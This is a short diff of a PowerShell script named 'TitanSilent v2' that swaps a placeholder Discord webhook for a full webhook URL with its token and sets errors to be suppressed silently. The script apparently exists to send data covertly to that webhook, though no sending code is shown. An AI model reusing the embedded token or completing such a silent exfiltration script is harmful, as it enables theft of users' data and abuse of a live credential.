@@ -1,5 +1,5 @@
 # TitanSilent v2
-$webhook = "https://discord.com/api/webhooks/..."  # 👈 dein Webhook
+$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"  # 👈 dein Webhook
 $ErrorActionPreference = "SilentlyContinue"
 Add-Type -AssemblyName System.Web
 
